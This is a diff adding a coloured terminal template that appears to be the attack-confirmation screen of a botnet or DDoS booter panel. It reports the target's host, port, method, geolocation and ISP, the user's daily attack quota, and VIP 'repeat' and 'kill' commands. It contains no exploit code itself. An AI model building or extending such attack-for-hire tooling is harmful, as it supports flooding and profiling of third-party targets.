@@ -1,0 +1,23 @@
+<<clear()>>
+<<full_screen_custom(93x29)>>
+
+
+[38;5;255m Attack sent [38;5;046msuccessfully[38;5;255m From <<$cnc_name>> !!
+
+[38;5;045m>>>[38;5;255m User[38;5;046m:[38;5;255m <<$user.username>>
+[38;5;045m>>>[38;5;255m Target[38;5;046m:[38;5;255m <<$target.host>> | Port[38;5;046m:[38;5;255m <<$port>>
+[38;5;045m>>>[38;5;255m Method Used[38;5;046m:[38;5;255m <<$target.method>>
+[38;5;045m>>>[38;5;255m Duration[38;5;046m:[38;5;255m <<$target.time_sent>> seconds
+[38;5;045m>>>[38;5;255m Location[38;5;046m:[38;5;255m <<$target.city>>, <<$target.country>>
+[38;5;045m>>>[38;5;255m City[38;5;046m:[38;5;255m <<$target.city>>
+[38;5;045m>>>[38;5;255m Target Zip[38;5;046m:[38;5;255m <<$target.zip>>
+[38;5;045m>>>[38;5;255m Target ISP[38;5;046m:[38;5;255m <<$target.isp>>
+[38;5;045m>>>[38;5;255m Organisation[38;5;046m:[38;5;255m <<$target.org>>
+[38;5;045m>>>[38;5;255m Target Timezone[38;5;046m:[38;5;255m <<$target.timezone>>
+[38;5;045m>>>[38;5;255m Attacks Left To Day[38;5;046m:[38;5;255m <<$user.daily_attack_left>> Max[38;5;046m:[38;5;255m <<$user.daily_attack_limit>>
+[38;5;045m>>>[38;5;255m Today's date and time[38;5;046m: [38;5;255m<<$short_date>> / <<time()>>
+
+If you are VIP (<<$user.vip>>) you can use "[38;5;45mrepeat[38;5;255m" cmd for spam <<$target.host>>
+
+Do you want [38;5;207mkill[38;5;255m attack sent ? use "[38;5;45mkill <<$target.host>>[38;5;255m" CMD
+
